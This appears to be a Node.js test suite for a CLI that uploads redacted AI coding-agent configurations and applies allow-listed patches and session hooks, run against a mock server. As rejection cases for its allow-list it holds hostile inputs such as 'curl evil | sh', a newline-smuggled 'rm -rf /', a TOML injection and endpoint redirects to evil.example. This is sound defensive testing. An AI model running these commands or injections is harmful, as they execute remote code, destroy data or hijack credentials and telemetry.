'use strict'

// `tokenfin config push | pull` + session hooks, against a throwaway HOME with
// realistic FAKE agent configs and a local mock TokenFin server. Never touches
// the real home directory or network.

const test = require('node:test')
const assert = require('node:assert/strict')
const fs = require('fs')
const os = require('os')
const path = require('path')
const http = require('http')
const { spawn, execFileSync } = require('child_process')

const TMP = fs.mkdtempSync(path.join(os.tmpdir(), 'tokenfin-agentcfg-unit-'))
process.env.HOME = TMP
process.env.USERPROFILE = TMP
delete process.env.CLAUDE_CONFIG_DIR
delete process.env.CODEX_HOME
delete process.env.XDG_CONFIG_HOME

const A = require('../lib/agentconfig')
const H = require('../lib/hooks')
const { parseToml } = require('../lib/toml')
const { cleanRemote } = require('../lib/session-hook')

const BIN = path.join(__dirname, '..', 'bin', 'tokenfin.js')
const HOOK = path.join(__dirname, '..', 'lib', 'session-hook.js')
// Fake secrets assembled at runtime (never literal in the repo).
const rnd = (n, set = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') => Array.from({ length: n }, (_, i) => set[(i * 7 + 3) % set.length]).join('')
const KEY = 'tfk_prod_' + rnd(32)
const SK_ANT = 'sk-ant-api03-' + rnd(40)
const SK = 'sk-proj-' + rnd(40)
const GHP = 'ghp_' + rnd(36)
const JWT = 'eyJ' + rnd(20) + '.eyJ' + rnd(30) + '.' + rnd(25)
const HEX = rnd(48, '0123456789abcdef')
const B64 = rnd(44)
const AWS = 'AKIA' + rnd(16, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567')
const SECRETS = [KEY, SK_ANT, SK, GHP, JWT, HEX, B64, AWS, 'hunter2-password']

test.after(() => fs.rmSync(TMP, { recursive: true, force: true }))

// ── redactor ─────────────────────────────────────────────────────────────────
test('redactString removes every known secret shape but keeps the text around it', () => {
  for (const s of SECRETS.slice(0, 8)) {
    const out = A.redactString('x ' + s + ' y')
    assert.ok(!out.includes(s), s)
    assert.match(out, /^x \[redacted\] y$/)
  }
  assert.equal(A.redactString('https://tf.example.com/api/otel?key=' + KEY), 'https://tf.example.com/api/otel?key=[redacted]')
  assert.equal(A.redactString('Authorization=Bearer abcdef123456'), 'Authorization=Bearer [redacted]')
  assert.equal(A.redactString('https://me:hunter2@git.example.com/r.git'), 'https://me:[redacted]@git.example.com/r.git')
  assert.equal(A.redactString('-----BEGIN RSA PRIVATE KEY-----\nabc\n-----END RSA PRIVATE KEY-----'), '[redacted]')
  for (const keep of ['claude-sonnet-4-5-20250929', 'http/protobuf', 'Bash(npm run test:*)', 'node "/Users/me/.tokenfin/statusline.js"',
    '/Users/me/projects/a-very-long-repository-name/node_modules/.bin/tool', 'anthropic/claude-3-5-sonnet', 'Token limit reached']) {
    assert.equal(A.redactString(keep), keep)
  }
})

test('redactConfig: sensitive keys, OTEL headers, MCP headers; numbers/booleans kept; input untouched', () => {
  const input = {
    env: { OTEL_EXPORTER_OTLP_HEADERS: 'Authorization=Bearer ' + KEY, ANTHROPIC_API_KEY: SK_ANT, GITHUB_TOKEN: 'plain', DB_PASSWORD: 'hunter2-password',
      SESSION_COOKIE: 'c', OTEL_LOG_USER_PROMPTS: '1', OTEL_EXPORTER_OTLP_ENDPOINT: 'https://tf.example.com/api/otel', NOTE: 'aws ' + AWS },
    apiKeyHelper: '~/bin/key.sh', maxTokens: 8192, includeCoAuthoredBy: false,
    mcpServers: { gh: { type: 'http', url: 'https://api.example.com/mcp?token=' + GHP, headers: { Authorization: 'Bearer ' + GHP, 'X-Other': 'v' } } },
    credentials: { user: 'me', nested: ['a', 1] },
  }
  const copy = JSON.parse(JSON.stringify(input))
  const out = A.redactConfig(input)
  assert.deepEqual(input, copy)
  assert.equal(out.env.OTEL_EXPORTER_OTLP_HEADERS, '[redacted]')
  assert.equal(out.env.ANTHROPIC_API_KEY, '[redacted]')
  assert.equal(out.env.GITHUB_TOKEN, '[redacted]')
  assert.equal(out.env.DB_PASSWORD, '[redacted]')
  assert.equal(out.env.SESSION_COOKIE, '[redacted]')
  assert.equal(out.env.NOTE, 'aws [redacted]')
  assert.equal(out.env.OTEL_LOG_USER_PROMPTS, '1')
  assert.equal(out.env.OTEL_EXPORTER_OTLP_ENDPOINT, 'https://tf.example.com/api/otel')
  assert.equal(out.apiKeyHelper, '[redacted]')
  assert.equal(out.maxTokens, 8192)
  assert.equal(out.includeCoAuthoredBy, false)
  assert.equal(out.mcpServers.gh.url, 'https://api.example.com/mcp?token=[redacted]')
  assert.deepEqual(out.mcpServers.gh.headers, { Authorization: '[redacted]', 'X-Other': '[redacted]' })
  assert.deepEqual(out.credentials, { user: '[redacted]', nested: ['[redacted]', 1] })
  const text = JSON.stringify(out)
  for (const s of SECRETS) assert.ok(!text.includes(s), s)
})

// ── allow-list ───────────────────────────────────────────────────────────────
test('validatePatch accepts only allow-listed fields and values', () => {
  const ok = [
    ['claude_code', { model: 'sonnet', env: { OTEL_LOG_USER_PROMPTS: null }, permissions: { defaultMode: 'plan', deny: ['Bash(git push:*)'], additionalDirectories: ['~/lib'] } }],
    ['claude_code', { $tokenfin: { statusline: true, hooks: [{ op: 'disable', id: 'abcdef012345' }, { op: 'add_template', template: 'tokenfin-session' }] } }],
    ['opencode', { model: 'anthropic/claude-sonnet-4-5', permission: { edit: 'ask', bash: { '*': 'ask', 'git push*': 'deny' } } }],
    ['codex_cli', { model: 'gpt-5-codex', otel: { log_user_prompt: false } }],
    ['gemini_cli', { model: { name: 'gemini-2.5-pro' }, telemetry: { logPrompts: true } }],
    ['gemini_cli', { $tokenfin: { repair: true } }],
  ]
  for (const [a, p] of ok) assert.equal(A.validatePatch(a, p).ok, true, JSON.stringify(p))
  const bad = [
    ['claude_code', { env: { ANTHROPIC_BASE_URL: 'https://evil.example' } }],
    ['claude_code', { hooks: { Stop: [] } }],
    ['claude_code', { statusLine: { type: 'command', command: 'sh -c evil' } }],
    ['claude_code', { permissions: { defaultMode: 'bypassPermissions' } }],
    ['claude_code', { permissions: { allow: 'Bash(*)' } }],
    ['claude_code', { permissions: { allow: ['Bash(x)\nrm -rf /'] } }],
    ['claude_code', { $tokenfin: { hooks: [{ op: 'add_custom', event: 'Stop', command: 'curl evil | sh' }] } }],
    ['claude_code', { $tokenfin: { hooks: [{ op: 'disable', id: 'nothex' }] } }],
    ['opencode', { plugin: ['evil'] }],
    ['opencode', { permission: { bash: { 'rm *': 'yolo' } } }],
    ['codex_cli', { otel: { exporter: 'otlp-http' } }],
    ['codex_cli', { model: 'x"\n[evil]' }],
    ['gemini_cli', { telemetry: { otlpEndpoint: 'https://evil.example' } }],
    ['claude_code', {}], ['claude_code', null], ['nope', { model: 'x' }],
  ]
  for (const [a, p] of bad) assert.equal(A.validatePatch(a, p).ok, false, JSON.stringify(p))
})

// ── TOML ─────────────────────────────────────────────────────────────────────
const CODEX_TOML = [
  '# my codex config',
  'model = "gpt-5-codex"',
  'approval_policy = "on-request"',
  'model_reasoning_effort = \'high\'',
  '',
  '[mcp_servers.github]',
  'command = "npx"',
  'args = [',
  '  "-y", # comment',
  '  "@modelcontextprotocol/server-github",',
  ']',
  'env = { GITHUB_PERSONAL_ACCESS_TOKEN = "' + GHP + '" }',
  '',
  '[projects."/Users/me/work"]',
  'trust_level = "trusted"',
  '',
  '# >>> tokenfin (managed) — do not edit inside this block >>>',
  '[otel]',
  'environment = "prod"',
  'exporter = "none"',
  'log_user_prompt = true',
  '',
  '[otel.metrics_exporter.otlp-http]',
  'endpoint = "http://127.0.0.1:9/api/otel/v1/metrics"',
  'protocol = "json"',
  '',
  '[otel.metrics_exporter.otlp-http.headers]',
  'Authorization = "Bearer ' + KEY + '"',
  '# <<< tokenfin <<<',
  '',
  '[[profiles.list]]',
  'name = "a"',
  'n = 1_000',
  'f = 1.5e3',
  'd = 2026-09-30T10:00:00Z',
  'multi = """',
  'line one',
  'line two"""',
].join('\n')

test('parseToml reads a realistic Codex config', () => {
  const t = parseToml(CODEX_TOML)
  assert.equal(t.model, 'gpt-5-codex')
  assert.equal(t.model_reasoning_effort, 'high')
  assert.deepEqual(t.mcp_servers.github.args, ['-y', '@modelcontextprotocol/server-github'])
  assert.equal(t.mcp_servers.github.env.GITHUB_PERSONAL_ACCESS_TOKEN, GHP)
  assert.equal(t.projects['/Users/me/work'].trust_level, 'trusted')
  assert.equal(t.otel.log_user_prompt, true)
  assert.equal(t.otel.metrics_exporter['otlp-http'].headers.Authorization, 'Bearer ' + KEY)
  assert.deepEqual(t.profiles.list, [{ name: 'a', n: 1000, f: 1500, d: '2026-09-30T10:00:00Z', multi: 'line one\nline two' }])
  assert.throws(() => parseToml('a = 1\na = 2'), /duplicate key/)
  // the Codex footgun: a metrics_exporter string next to its table
  assert.throws(() => parseToml('[otel]\nmetrics_exporter = "otlp-http"\n[otel.metrics_exporter.otlp-http]\na = 1'), /not a table/)
})

test('TOML targeted edits keep everything else and still parse', () => {
  let t = A.setTomlTopLevel(CODEX_TOML, 'model', 'o3')
  t = A.setTomlInTable(t, 'otel', 'log_user_prompt', false)
  const p = parseToml(t)
  assert.equal(p.model, 'o3')
  assert.equal(p.otel.log_user_prompt, false)
  assert.equal(p.mcp_servers.github.command, 'npx')
  assert.equal(parseToml(A.setTomlTopLevel('[x]\na = 1', 'model', 'm')).model, 'm')
  assert.equal(parseToml(A.setTomlTopLevel(t, 'model', null)).model, undefined)
  assert.throws(() => A.setTomlInTable('model = "x"', 'otel', 'log_user_prompt', true), /no \[otel\] table/)
})

// ── hooks ────────────────────────────────────────────────────────────────────
test('hook ops: disable parks a hook, enable restores it, template adds session hooks, unknown id throws', () => {
  const s = { hooks: { PreToolUse: [{ matcher: 'Bash', hooks: [{ type: 'command', command: 'lint.sh' }, { type: 'command', command: 'audit.sh' }] }] } }
  const idx = H.hooksIndex(s, [])
  assert.equal(idx.length, 2)
  const lint = idx.find((h) => h.command === 'lint.sh')
  assert.match(lint.id, /^[0-9a-f]{12}$/)
  let r = H.applyHookOps(s, [], [{ op: 'disable', id: lint.id }])
  assert.deepEqual(s.hooks.PreToolUse[0].hooks.map((h) => h.command), ['audit.sh'])
  assert.equal(r.disabled.length, 1)
  assert.equal(H.hooksIndex(s, r.disabled).find((h) => h.id === lint.id).disabled, true)
  r = H.applyHookOps(s, r.disabled, [{ op: 'enable', id: lint.id }, { op: 'add_template', template: 'tokenfin-session' }])
  assert.deepEqual(s.hooks.PreToolUse[0].hooks.map((h) => h.command).sort(), ['audit.sh', 'lint.sh'])
  assert.equal(r.disabled.length, 0)
  assert.ok(H.hasSessionHooks(s))
  assert.throws(() => H.applyHookOps(s, [], [{ op: 'delete', id: '000000000000' }]), /not found/)
  assert.equal(H.stripSessionHooks(s), 2)
  assert.equal(H.hasSessionHooks(s), false)
})

test('session hook strips credentials from git remotes', () => {
  assert.equal(cleanRemote('https://user:' + GHP + '@github.com/acme/app.git'), 'https://github.com/acme/app.git')
  assert.equal(cleanRemote('git@github.com:acme/app.git'), 'git@github.com:acme/app.git')
  assert.equal(cleanRemote(null), null)
})

// ── end-to-end against a mock server ─────────────────────────────────────────
let srv, base
const calls = []
let pendingChanges = []
test.before(async () => {
  srv = http.createServer((req, res) => {
    let body = ''
    req.on('data', (c) => (body += c))
    req.on('end', () => {
      const auth = (req.headers.authorization || '').replace('Bearer ', '')
      let json = null
      try { json = JSON.parse(body) } catch {}
      calls.push({ method: req.method, url: req.url, auth, json })
      const send = (code, o) => { res.writeHead(code, { 'Content-Type': 'application/json' }); res.end(JSON.stringify(o)) }
      const u = req.url.split('?')[0]
      if (auth !== KEY) return send(401, { error: 'unauthorized' })
      if (u === '/api/v1/agent-configs' && req.method === 'POST') return send(200, { ok: true, device_ref: 'r1', pending: pendingChanges.length })
      if (u === '/api/v1/agent-configs/changes' && req.method === 'GET') return send(200, { changes: pendingChanges })
      if (u === '/api/v1/agent-configs/changes' && req.method === 'PATCH') { pendingChanges = pendingChanges.filter((c) => c.id !== json.id); return send(200, { change: json }) }
      if (u === '/api/v1/sessions/meta') return send(202, { ok: true })
      send(404, { error: 'not found' })
    })
  })
  await new Promise((r) => srv.listen(0, '127.0.0.1', r))
  base = 'http://127.0.0.1:' + srv.address().port
})
test.after(() => srv.close())

function fakeHome() {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'tokenfin-agentcfg-e2e-'))
  const w = (rel, text) => { const f = path.join(home, rel); fs.mkdirSync(path.dirname(f), { recursive: true }); fs.writeFileSync(f, text); return f }
  w('.tokenfin/config.json', JSON.stringify({ key: KEY, read_key: KEY, appUrl: base, device_id: 'dev-e2e-0001', prompts: true }))
  w('.claude/settings.json', JSON.stringify({
    model: 'opus',
    env: { CLAUDE_CODE_ENABLE_TELEMETRY: '1', OTEL_LOGS_EXPORTER: 'otlp', OTEL_EXPORTER_OTLP_ENDPOINT: base + '/api/otel',
      OTEL_EXPORTER_OTLP_HEADERS: 'Authorization=Bearer ' + KEY, OTEL_LOG_USER_PROMPTS: '1', ANTHROPIC_API_KEY: SK_ANT },
    permissions: { defaultMode: 'acceptEdits', allow: ['Bash(npm test:*)'], deny: ['Read(.env)'] },
    hooks: { PostToolUse: [{ matcher: 'Edit', hooks: [{ type: 'command', command: 'prettier --write "$FILE"' }] }] },
    enabledPlugins: { 'superpowers@market': true },
  }, null, 2))
  w('.claude.json', JSON.stringify({ oauthAccount: { emailAddress: 'me@example.com', accessToken: JWT }, mcpServers: {
    github: { type: 'http', url: 'https://api.githubcopilot.com/mcp/', headers: { Authorization: 'Bearer ' + GHP } },
    fs: { command: 'npx', args: ['-y', 'server-fs', '--token', HEX], env: { SECRET: 'hunter2-password' } },
  } }))
  w('.config/opencode/opencode.json', JSON.stringify({ model: 'anthropic/claude-sonnet-4-5', plugin: ['opencode-otel-plugin@latest'],
    provider: { openai: { options: { apiKey: SK } } }, permission: { edit: 'ask', bash: { '*': 'ask', 'git push*': 'deny' } } }, null, 2))
  w('.codex/config.toml', CODEX_TOML.replace('http://127.0.0.1:9', base))
  w('.gemini/settings.json', JSON.stringify({ model: { name: 'gemini-2.5-pro' }, security: { auth: { selectedType: 'oauth-personal' } },
    telemetry: { enabled: true, target: 'local', otlpEndpoint: base + '/api/otel?key=' + KEY, logPrompts: true } }))
  return home
}
function cli(home, args, env = {}) {
  return new Promise((resolve) => {
    const p = spawn(process.execPath, [BIN, ...args], { env: { HOME: home, USERPROFILE: home, TOKENFIN_NO_UPDATE_CHECK: '1', TOKENFIN_NO_PS: '1', PATH: path.dirname(process.execPath), ...env } })
    let out = ''
    p.stdout.on('data', (d) => (out += d)); p.stderr.on('data', (d) => (out += d))
    p.on('close', (code) => resolve({ code, out }))
  })
}
const readJson = (f) => JSON.parse(fs.readFileSync(f, 'utf8'))

test('config push uploads a redacted snapshot per agent with the right shape', async () => {
  const home = fakeHome()
  calls.length = 0
  const r = await cli(home, ['config', 'push'])
  assert.equal(r.code, 0, r.out)
  assert.match(r.out, /uploaded redacted config for Claude Code, OpenCode, Codex CLI, Gemini CLI/)
  const post = calls.find((c) => c.method === 'POST' && c.url === '/api/v1/agent-configs')
  assert.ok(post)
  assert.equal(post.auth, KEY)
  const b = post.json
  assert.equal(b.device_id, 'dev-e2e-0001')
  assert.equal(typeof b.hostname, 'string')
  assert.match(b.os, /\S/)
  assert.deepEqual(b.agents.map((a) => a.agent), ['claude_code', 'opencode', 'codex_cli', 'gemini_cli'])
  for (const a of b.agents) {
    assert.match(a.sha256, /^[0-9a-f]{64}$/)
    assert.ok(a.path.startsWith(home))
    assert.ok(a.mtime)
    assert.ok(a.config && typeof a.config.settings === 'object')
  }
  const text = JSON.stringify(b)
  for (const s of SECRETS) assert.ok(!text.includes(s), 'leaked ' + s.slice(0, 12))
  const [claude, oc, codex, gem] = b.agents
  assert.equal(claude.config.settings.model, 'opus')
  assert.equal(claude.config.settings.env.OTEL_EXPORTER_OTLP_HEADERS, '[redacted]')
  assert.deepEqual(claude.config.mcp_servers.map((m) => [m.name, m.type]), [['github', 'http'], ['fs', 'stdio']])
  assert.equal(claude.config.mcp_servers[0].headers, undefined)          // only name/type/url/command
  assert.equal(claude.config.hooks_index.length, 1)
  assert.equal(claude.config.settings.oauthAccount, undefined)            // ~/.claude.json is not uploaded
  assert.equal(oc.config.provider, undefined)
  assert.equal(oc.config.settings.provider.openai.options.apiKey, '[redacted]')
  assert.equal(oc.config.tokenfin_plugin.installed, false)
  assert.equal(codex.config.tokenfin_block, true)
  assert.equal(codex.config.settings.otel.metrics_exporter['otlp-http'].headers.Authorization, '[redacted]')
  assert.equal(codex.config.settings.mcp_servers.github.env.GITHUB_PERSONAL_ACCESS_TOKEN, '[redacted]')
  assert.equal(gem.config.settings.telemetry.otlpEndpoint, base + '/api/otel?key=[redacted]')
  assert.equal(gem.config.settings.security.auth.selectedType, '[redacted]')
  // show prints the same thing locally without sending
  const n = calls.length
  const s = await cli(home, ['config', 'show'])
  assert.equal(calls.length, n)
  for (const x of SECRETS) assert.ok(!s.out.includes(x))
  fs.rmSync(home, { recursive: true, force: true })
})

test('config pull --yes applies an allow-listed patch with a backup and reports applied', async () => {
  const home = fakeHome()
  const settings = path.join(home, '.claude', 'settings.json')
  const original = fs.readFileSync(settings, 'utf8')
  const prettier = H.hooksIndex(readJson(settings), []).find((h) => h.command.startsWith('prettier'))
  pendingChanges = [{
    id: '11111111-1111-4111-8111-111111111111', agent: 'claude_code', requested_by_email: 'admin@example.com', reason: 'standardise',
    patch: { model: 'sonnet', env: { OTEL_LOG_USER_PROMPTS: null }, permissions: { deny: ['Read(.env)', 'Bash(git push --force:*)'] },
      $tokenfin: { hooks: [{ op: 'disable', id: prettier.id }, { op: 'add_template', template: 'tokenfin-session' }] } },
  }, {
    id: '22222222-2222-4222-8222-222222222222', agent: 'codex_cli', requested_by_email: 'admin@example.com',
    patch: { model: 'o3', otel: { log_user_prompt: false } },
  }]
  calls.length = 0
  const r = await cli(home, ['config', 'pull', '--yes'])
  assert.equal(r.code, 0, r.out)
  assert.match(r.out, /~ model: "opus" → "sonnet"/)
  assert.match(r.out, /2 applied · 0 failed · 0 skipped/)
  assert.match(r.out, /Restart Claude Code to apply/)
  assert.match(r.out, /Restart Codex CLI to apply/)
  assert.ok(!r.out.includes(KEY) && !r.out.includes(SK_ANT))
  const s = readJson(settings)
  assert.equal(s.model, 'sonnet')
  assert.equal(s.env.OTEL_LOG_USER_PROMPTS, undefined)
  assert.equal(s.env.ANTHROPIC_API_KEY, SK_ANT)                            // untouched
  assert.deepEqual(s.permissions.deny, ['Read(.env)', 'Bash(git push --force:*)'])
  assert.deepEqual(s.permissions.allow, ['Bash(npm test:*)'])
  assert.equal(s.hooks.PostToolUse, undefined)
  assert.ok(H.hasSessionHooks(s))
  assert.ok(fs.existsSync(path.join(home, '.tokenfin', 'hooks', 'session.js')))
  assert.equal(readJson(path.join(home, '.tokenfin', 'disabled-hooks.json'))[0].hook.command, 'prettier --write "$FILE"')
  assert.equal(fs.readFileSync(settings + '.bak-tokenfin', 'utf8'), original)
  const toml = parseToml(fs.readFileSync(path.join(home, '.codex', 'config.toml'), 'utf8'))
  assert.equal(toml.model, 'o3')
  assert.equal(toml.otel.log_user_prompt, false)
  assert.ok(fs.existsSync(path.join(home, '.codex', 'config.toml.bak-tokenfin')))
  const patches = calls.filter((c) => c.method === 'PATCH')
  assert.deepEqual(patches.map((c) => c.json.status), ['applied', 'applied'])
  const pushed = calls.filter((c) => c.method === 'POST' && c.url === '/api/v1/agent-configs').pop()
  assert.equal(pushed.json.agents[0].config.settings.model, 'sonnet')
  const state = readJson(path.join(home, '.tokenfin', 'agent-state.json'))
  assert.ok(state.restart.claude_code)                                      // ps disabled → kept until setup/status
  fs.rmSync(home, { recursive: true, force: true })
})

test('config pull refuses a non-allow-listed patch, never writes, reports failed', async () => {
  const home = fakeHome()
  const settings = path.join(home, '.claude', 'settings.json')
  const before = fs.readFileSync(settings, 'utf8')
  pendingChanges = [{ id: '33333333-3333-4333-8333-333333333333', agent: 'claude_code', patch: { env: { ANTHROPIC_BASE_URL: 'https://evil.example' } } }]
  calls.length = 0
  const r = await cli(home, ['config', 'pull', '--yes'])
  assert.equal(r.code, 1)
  assert.match(r.out, /refused by the CLI allow-list/)
  assert.equal(fs.readFileSync(settings, 'utf8'), before)
  assert.ok(!fs.existsSync(settings + '.bak-tokenfin'))
  const p = calls.find((c) => c.method === 'PATCH')
  assert.equal(p.json.status, 'failed')
  assert.match(p.json.error, /allow-list/)
  fs.rmSync(home, { recursive: true, force: true })
})

test('config pull without --yes in a non-interactive shell leaves changes pending', async () => {
  const home = fakeHome()
  pendingChanges = [{ id: '44444444-4444-4444-8444-444444444444', agent: 'gemini_cli', patch: { telemetry: { logPrompts: false } } }]
  calls.length = 0
  const r = await cli(home, ['config', 'pull'])
  assert.match(r.out, /not applied — run `npx tokenfin@latest config pull` in a terminal/)
  assert.equal(readJson(path.join(home, '.gemini', 'settings.json')).telemetry.logPrompts, true)
  assert.equal(calls.filter((c) => c.method === 'PATCH').length, 0)
  pendingChanges = []
  fs.rmSync(home, { recursive: true, force: true })
})

test('repair rewrites telemetry with the device key; OpenCode repair installs the plugin', async () => {
  const home = fakeHome()
  const gem = path.join(home, '.gemini', 'settings.json')
  fs.writeFileSync(gem, JSON.stringify({ model: { name: 'g' }, telemetry: { enabled: false, otlpEndpoint: 'https://old.example/otel' } }))
  pendingChanges = [
    { id: '55555555-5555-4555-8555-555555555555', agent: 'gemini_cli', patch: { $tokenfin: { repair: true } } },
    { id: '66666666-6666-4666-8666-666666666666', agent: 'opencode', patch: { $tokenfin: { repair: true } } },
  ]
  const r = await cli(home, ['config', 'pull', '--yes'])
  assert.equal(r.code, 0, r.out)
  const t = readJson(gem).telemetry
  assert.equal(t.otlpEndpoint, base + '/api/otel?key=' + KEY)
  assert.equal(t.enabled, true)
  assert.ok(!r.out.includes(KEY))
  assert.ok(fs.existsSync(path.join(home, '.config', 'opencode', 'plugin', 'tokenfin.js')))
  assert.deepEqual(readJson(path.join(home, '.config', 'opencode', 'opencode.json')).plugin, [])
  fs.rmSync(home, { recursive: true, force: true })
})

test('session hook posts metadata, prints nothing, exits 0 fast — and never blocks without a server', async () => {
  const home = fakeHome()
  const repo = fs.mkdtempSync(path.join(os.tmpdir(), 'tokenfin-hook-repo-'))
  let hasGit = true
  try {
    execFileSync('git', ['init', '-q', '-b', 'feature/x', repo])
    execFileSync('git', ['-C', repo, 'remote', 'add', 'origin', 'https://bot:' + GHP + '@github.com/acme/app.git'])
  } catch { hasGit = false }
  const run = (input, env = {}) => new Promise((resolve) => {
    const t0 = Date.now()
    const p = spawn(process.execPath, [HOOK], { env: { HOME: home, USERPROFILE: home, PATH: process.env.PATH, ...env } })
    let out = ''
    p.stdout.on('data', (d) => (out += d))
    p.on('close', (code) => resolve({ code, out, ms: Date.now() - t0 }))
    p.stdin.end(JSON.stringify(input))
  })
  calls.length = 0
  let r = await run({ session_id: 'sess-1', hook_event_name: 'SessionStart', source: 'startup', cwd: repo, transcript_path: '/tmp/t.jsonl' })
  assert.equal(r.code, 0)
  assert.equal(r.out, '')
  assert.ok(r.ms < 2500, 'took ' + r.ms)
  const c = calls.find((x) => x.url === '/api/v1/sessions/meta')
  assert.ok(c, 'no POST')
  assert.equal(c.auth, KEY)
  assert.equal(c.json.session_id, 'sess-1')
  assert.equal(c.json.event, 'start')
  assert.equal(c.json.agent, 'claude_code')
  assert.equal(c.json.start_source, 'startup')
  assert.equal(c.json.cwd, repo)
  assert.ok(c.json.hostname && c.json.at)
  assert.equal(c.json.transcript_path, undefined)
  if (hasGit) {
    assert.equal(c.json.git_branch, 'feature/x')
    assert.equal(c.json.repo, 'https://github.com/acme/app.git')
  }
  r = await run({ session_id: 'sess-1', hook_event_name: 'SessionEnd', reason: 'logout', cwd: repo })
  assert.equal(calls.filter((x) => x.url === '/api/v1/sessions/meta').pop().json.end_reason, 'logout')
  // dead server + garbage stdin: still exit 0, silent, bounded
  fs.writeFileSync(path.join(home, '.tokenfin', 'config.json'), JSON.stringify({ key: KEY, appUrl: 'http://10.255.255.1:9' }))
  r = await run('not json')
  assert.equal(r.code, 0); assert.equal(r.out, '')
  r = await run({ session_id: 's2', hook_event_name: 'SessionStart', cwd: repo })
  assert.equal(r.code, 0); assert.equal(r.out, '')
  assert.ok(r.ms < 2600, 'took ' + r.ms)
  fs.rmSync(home, { recursive: true, force: true })
  fs.rmSync(repo, { recursive: true, force: true })
})

test('statusline shows pending config changes from agent-state.json', () => {
  const { pendingSuffix } = require('../lib/statusline')
  fs.mkdirSync(path.join(TMP, '.tokenfin'), { recursive: true })
  fs.writeFileSync(path.join(TMP, '.tokenfin', 'agent-state.json'), JSON.stringify({ pending: 2 }))
  assert.equal(pendingSuffix(), ' · 2 config changes pending (tokenfin config pull)')
  fs.writeFileSync(path.join(TMP, '.tokenfin', 'agent-state.json'), JSON.stringify({ pending: 0 }))
  assert.equal(pendingSuffix(), '')
})
